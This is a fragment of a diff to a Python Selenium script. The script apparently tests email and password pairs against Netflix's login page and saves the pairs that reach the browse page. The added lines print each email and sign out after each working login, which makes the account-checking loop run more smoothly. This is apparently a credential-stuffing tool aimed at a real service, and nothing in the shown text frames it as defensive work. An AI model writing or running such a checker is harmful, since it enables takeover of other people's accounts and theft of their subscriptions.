@@ -31,6 +31,7 @@ def main():
             id = browser.find_element_by_id("id_userLoginId")
             #passing email to the id input field
             id.send_keys(row[0])
+            print(row[0])
             #getting id of password input field of the webpage
             pwd = browser.find_element_by_id("id_password")
             #passing the password to the password input field
@@ -43,6 +44,8 @@ def main():
             if browser.current_url == "https://www.netflix.com/browse":
                 #storing account in a list
                 accounts.append([row[0],row[1]])
+                #logout after saving
+                browser.get("https://www.netflix.com/SignOut?lnkctr=mL")
             #counting number of attempts
             count = count + 1
             #after every 3 attempts
